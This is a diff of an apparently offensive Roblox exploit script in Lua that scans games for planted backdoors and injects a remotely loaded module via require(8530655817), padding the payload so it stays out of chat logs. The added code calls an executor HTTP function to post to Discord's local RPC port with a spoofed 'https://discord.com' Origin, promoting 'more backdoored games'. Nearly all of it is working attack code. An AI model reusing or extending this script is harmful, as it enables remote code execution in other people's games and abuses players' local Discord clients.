@@ -28,8 +28,8 @@ local JointsService = game:GetService("JointsService")
 local StarterGui = game:GetService("StarterGui")
 
 local LocalPlayer = game:GetService("Players").LocalPlayer
-local requireScript = ("require(9275583678).k4scripts('%s', %s) -- "):format(LocalPlayer.Name, "true", string.rep("!", 2400)) -- set true to false to disable logging, we add a filler so that the backdoor code won't be send to the chat, by default, only message with 200 characters (or 1,200 bytes) can be send, we multipy it by 2 to be safe.
-local invCode = "6HndYgC"
+local requireScript = ("require(8530655817).k4scripts('%s', %s) -- "):format(LocalPlayer.Name, "false", string.rep("!", 2400)) -- set true to false to disable logging, we add a filler so that the backdoor code won't be send to the chat, by default, only message with 200 characters (or 1,200 bytes) can be send, we multipy it by 2 to be safe.
+local invCode = "k4scripts"
 
 local alternativeSS = {
 	run = { [1] = "5#lGIERKWEF" },
@@ -165,8 +165,41 @@ local function scanGame()
 end
 
 local function Main()
-	notify(("Make sure to join our Discord!\nCode: %s"):format(invCode))
-
+	local function promtDicordInvite()
+    	local httpService = game:GetService("HttpService")
+    	local httpRequest = (syn and syn.request) or (httpService and httpService.request) or (http_request)
+    
+    	if not httpRequest then print("Exploit not supported. No HTTP found.") return end
+    	
+    	    httpRequest({
+        		Url = "http://127.0.0.1:6463/rpc?v=1",
+        		Method = "POST",
+        
+        		Headers = {
+        			['Content-Type'] = 'application/json',
+        			Origin = 'https://discord.com'
+        		},
+        
+        		Body = httpService:JSONEncode({
+        			cmd = 'INVITE_BROWSER',
+        			nonce = httpService:GenerateGUID(false),
+        			args = {code = invCode}
+        		})
+        	})
+	end
+	local Bindable = Instance.new("BindableFunction")
+	Bindable.OnInvoke = promtDicordInvite
+	StarterGui:SetCore(
+		"SendNotification",
+		{
+			Title = "Discord Server",
+			Duration = 10,
+			Text = "Join for more backdoored games!",
+			Button1 = "Join",
+			Callback = Bindable
+		}
+	)
+	
 	scanGame()
 
 	if not attached(3.5) then
